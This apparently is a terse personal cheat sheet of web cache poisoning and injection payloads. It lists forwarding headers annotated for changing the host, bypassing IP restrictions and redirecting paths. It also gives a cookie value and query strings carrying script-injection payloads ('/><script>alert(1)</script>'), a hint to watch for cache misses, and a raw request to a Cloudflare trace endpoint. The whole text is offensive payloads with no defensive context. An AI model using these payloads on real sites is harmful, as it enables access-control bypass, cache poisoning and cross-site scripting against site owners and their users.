
////// HOST headers
X-Forwarded-Host: /// change host
X-Forwarded-Scheme: /// change host
X-Forwarded-For: /// bypass ip restriction block 
X-Original-Url: /// redirect to any path 
X-Host: /// if you have victim user agent


///// HOST cookie
any-cookie=someString"-alert(1)-"someString

//// url query string ===> chackout if you get x-cahce: miss after changing /?query in request 
/?lee101='/><script>alert(1)</script>
/?utm_content='/><script>alert(1)</script>


GET /cd-cgi/trace HTTP/1.1
Host: cloudflare.com